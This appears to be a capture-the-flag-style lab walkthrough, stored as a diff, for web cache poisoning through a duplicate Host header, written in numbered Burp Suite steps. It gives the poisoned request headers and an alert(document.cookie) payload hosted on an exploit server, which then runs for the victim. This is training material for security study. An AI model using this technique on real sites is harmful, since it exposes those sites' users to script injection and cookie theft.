@@ -1,0 +1,33 @@
+Steps:
+
+1. Open the lab in Burp's browser and refresh the home page.
+2. In Proxy → HTTP history, find the:
+   GET /
+   request and send it to Burp Repeater.
+3. Confirm that modifying the main Host header prevents access to the home page.
+4. Add a cache-buster query parameter:
+   GET /?cb=123
+   Use a different value whenever a fresh response from the back-end is needed.
+5. Add a second Host header with an arbitrary value:
+   Host: <lab-domain>
+   Host: arbitrary-value
+6. Observe that the second Host header is ignored for validation/routing but its value is reflected in the absolute URL used to load:
+   /resources/js/tracking.js
+7. Remove the second Host header and resend the request with the same cache buster. Confirm that the cached response still contains the injected value.
+8. Open the Exploit Server and create:
+   /resources/js/tracking.js
+9. Put the following payload in the file:
+   alert(document.cookie)
+10. Store the exploit and copy the Exploit Server domain.
+11. In Burp Repeater, add the Exploit Server as the second Host header:
+GET /?cb=123 HTTP/1.1
+Host: <lab-domain>
+Host: <exploit-server-domain>
+12. Send the request until the response shows a cache hit and the script URL points to the Exploit Server.
+13. Open the home page in the browser using the same cache buster:
+/?cb=123
+14. Confirm that:
+alert(document.cookie)
+executes.
+15. Remove the cache buster and replay the poisoned request until the home page cache is successfully poisoned.
+16. Wait for/request the home page as the victim. The lab is solved when the payload executes.
